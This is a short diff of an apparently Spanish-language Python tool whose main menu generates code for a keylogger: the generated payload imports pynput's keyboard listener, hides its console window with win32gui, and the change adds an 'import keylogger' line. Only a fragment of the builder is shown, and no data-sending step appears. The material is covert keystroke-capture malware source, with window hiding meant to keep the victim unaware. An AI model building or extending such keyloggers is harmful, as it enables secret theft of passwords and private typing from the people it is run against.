@@ -1,5 +1,4 @@
 import os
-import subprocess
 
 os.system("clear")
 
@@ -16,6 +15,7 @@ def menu_principal():
             codigo = '''from pynput import keyboard
 import win32console
 import win32gui
+import keylogger
             
 ventana = win32console.GetConsoleWindow()
 win32gui.ShowWindow(ventana, 0)
